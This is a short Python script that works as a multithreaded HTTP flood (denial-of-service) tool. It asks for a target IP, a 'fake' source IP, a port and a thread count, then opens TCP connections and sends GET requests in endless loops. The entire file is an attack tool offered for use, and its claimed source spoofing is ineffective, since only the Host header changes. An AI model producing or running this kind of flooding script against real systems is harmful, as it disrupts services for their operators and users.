import socket
import threading

target = input(">> Enter the target IP: ")
fake_ip = input(">> Enter your source IP: ")
port = int(input(">> Enter the target port number: "))
thr = int(input(">> Enter the number of parallel threads to execute: "))
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print("Request Sent: ", attack_num)        
        s.close()

for i in range(thr):
    thread = threading.Thread(target=attack)
    thread.start()
